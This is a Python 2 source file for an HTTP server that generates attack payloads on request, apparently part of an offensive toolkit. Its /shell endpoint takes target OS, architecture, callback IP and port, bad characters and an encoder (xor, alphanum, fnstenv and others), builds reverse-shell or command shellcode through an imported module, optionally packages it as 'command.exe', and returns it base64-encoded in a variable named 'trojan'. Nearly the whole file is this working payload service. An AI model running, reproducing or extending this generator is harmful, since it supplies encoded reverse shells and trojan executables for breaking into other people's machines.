#!/usr/bin/python
from BaseHTTPServer import BaseHTTPRequestHandler
from BaseHTTPServer import HTTPServer
import sys
import base64
import urlparse
sys.path.append("./shellcodes")
from Shellcodes import OSShellcodes
# for server generate under linux required install nasm


class cloudShellHandler(BaseHTTPRequestHandler):

    def init_shell_var(self):
        self.encoders = [1, "xor", "alphanum", "rot_13", "fnstenv", "jumpcall"]
        self.s_o = {}
        self.s_o["os"] = "WINDOWS"
        self.s_o["arch"] = "32bit"
        self.s_o["badchars"] = ""
        self.s_o["type"] = "command"
        self.s_o["exe"] = False
        self.s_o["encode"] = 0
        self.s_o["ip"] = 0
        self.s_o["port"] = 0
        self.s_o["command"] = ""
        self.help_string = "http://server_ip:server_port/shell?os=Windows"
        self.help_string += "&arch=32bit&type=reverse&ip=192.168.1.110"
        self.help_string += "&port=4000&badchars=0;255;"
        self.help_string += "&encoder=xor&exe=true"

    def gen_shellcode(self):
        # print(make_exe)
        try:
            sys.path.append("shellcodes")
            s_o = self.s_o
            s = OSShellcodes(s_o["os"], s_o["arch"], s_o[
                             "ip"], s_o["port"], s_o["badchars"])
            trojan = s.create_shellcode(
                s_o["type"],
                encode=s_o["encode"],
                make_exe=s_o["exe"],
                command=s_o["command"],
                debug=1,
                filename="command.exe"
            )
        except Exception as e:
            print(e)
            return False
        if self.s_o["exe"]:
            with open(s.get_exe_path()) as f:
                trojan = f.read()
        return base64.b64encode(trojan)

    def create_shellcode(self, options):
        for key, value in options.iteritems():
            self.s_o[key] = value[0]
        if self.s_o['encode'] and self.s_o['encode'].isdigit():
            self.s_o['encode'] = int(self.s_o['encode'])
        self.s_o['exe'] = True if self.s_o['exe'].lower() == 'true' else False
        self.s_o['port'] = int(self.s_o['port']) if self.s_o['port'] and self.s_o[
            'port'].isdigit() else 4000
        self.s_o['badchars'] = ""
        if "badchars=" in self.path:
            try:
                for i in self.path.split("badchars=")[1].strip(";").split(";"):
                    self.s_o['badchars'] += chr(int(i))
            except:
                self.s_o['badchars'] = ""
                pass
        try:
            return self.gen_shellcode()
        except Exception as e:
            print(e)
            self.send_response(500)
            return self.help_string

    # This class will handles any incoming request from
    # the browser

    def do_GET(self):
        self.init_shell_var()
        send = self.help_string
        if "/shell?" in self.path:
            self.send_response(200)
            # Send the html message
            url = urlparse.urlparse(self.path)
            options = urlparse.parse_qs(url.query)
            try:
                send = self.create_shellcode(options)
                send = self.help_string if not send else send
            except Exception as e:
                print(e)
        else:
            self.send_response(404)
        self.send_header('Content-type', 'text/html')
        self.end_headers()
        self.wfile.write(send)
        return


if __name__ == '__main__':
    if len(sys.argv) == 2:
        try:
            PORT_NUMBER = int(sys.argv[1])
        except ValueError:
            PORT_NUMBER = 8080
            pass
    else:
        PORT_NUMBER = 8080
    try:
        # Create a web server and define the handler to manage the
        # incoming request
        server = HTTPServer(('', PORT_NUMBER), cloudShellHandler)
        print("Started httpserver on port %d" % PORT_NUMBER)
        # Wait forever for incoming htto requests
        server.serve_forever()
    except KeyboardInterrupt as e:
        print("^C catch. Server soon will be close")
        server.socket.close()
